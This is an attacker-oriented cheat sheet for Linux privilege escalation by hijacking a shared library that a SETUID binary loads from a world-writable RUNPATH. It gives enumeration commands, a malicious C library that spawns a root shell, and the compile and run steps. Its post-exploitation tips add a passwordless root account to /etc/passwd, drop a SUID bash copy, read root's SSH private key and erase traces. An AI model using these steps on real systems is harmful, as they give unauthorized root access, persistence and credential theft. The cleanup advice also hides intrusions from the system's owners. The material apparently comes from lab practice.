### 1. Technique Name:

Shared Object Hijacking
### 2. Summary:

Shared Object Hijacking is a Linux privilege escalation technique where an attacker abuses misconfigured shared library loading paths in binaries—especially SETUID binaries—to inject and execute malicious code. When a binary is configured to load libraries from a writable directory (e.g., via `RUNPATH` or `rpath`), an attacker can place a crafted `.so` file that overrides the legitimate dependency and executes code as the binary’s owner, often root.
### 3. Conditions / Requirements:

- Target binary is SETUID root    
- Binary loads a non-standard library (e.g., `libshared.so`)
- The loading path (e.g., `/development`) is world-writable
- Attacker can determine or guess the symbol name (function) being called from the library
### 4. Enumeration Steps:
#### A. Identify SETUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```
#### B. List linked libraries of the target binary:

```bash
ldd <binary>
```

Example:

```bash
ldd payroll
```

Look for non-standard libraries (e.g., `/development/libshared.so`).
#### C. Check for custom RUNPATH:

```bash
readelf -d <binary> | grep PATH
```

Example:

```bash
readelf -d payroll | grep PATH
```
#### D. Verify write permissions on the custom path:

```bash
ls -ld /development
```

Should be writable (e.g., `drwxrwxrwx`).
#### E. Check for undefined symbols:

Run the binary and look for errors like:

```bash
symbol lookup error: ./binary: undefined symbol: dbquery
```
### 5. Exploitation Steps:
#### A. Write a malicious shared object:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
#### B. Compile the malicious library:

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
#### C. Execute the vulnerable binary:

```bash
./payroll
```

If successful, it will display:

```
Malicious library loaded
# id
uid=0(root) gid=1000(<your user>) groups=1000(<your group>)
```
### 6. Post-Exploitation Tips:

- Drop a SUID shell:    

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

- Add a backdoor user:

```bash
echo 'attacker::0:0::/root:/bin/bash' >> /etc/passwd
```

- Exfiltrate files (e.g., `/etc/shadow`, SSH keys):

```bash
cat /root/.ssh/id_rsa
```

- Clean up traces:

```bash
rm /development/libshared.so
```
### 7. Example / Notes:

Target binary:

```bash
-rwsr-xr-x 1 root root 16728 payroll
```

Linked libraries:

```bash
ldd payroll

libshared.so => /development/libshared.so
```

Vulnerable RUNPATH:

```bash
readelf -d payroll | grep PATH

Library runpath: [/development]
```

Undefined function hint:

```bash
./payroll
symbol lookup error: ./payroll: undefined symbol: dbquery
```

Malicious Library Compilation:

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Execution:

```bash
./payroll
Malicious library loaded
# id
uid=0(root)
```

This confirms privilege escalation via Shared Object Hijacking.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Shared_Object_Hijacking